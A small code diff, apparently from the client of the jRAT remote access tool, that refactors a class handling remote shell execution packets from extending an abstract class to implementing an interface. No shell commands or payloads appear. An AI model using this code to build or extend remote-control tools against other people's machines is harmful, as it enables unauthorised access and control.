@@ -6,7 +6,7 @@ import jrat.client.LaunchProcess;
 import java.io.PrintWriter;
 
 
-public class Packet25RemoteShellExecute extends AbstractIncomingPacket {
+public class Packet25RemoteShellExecute implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
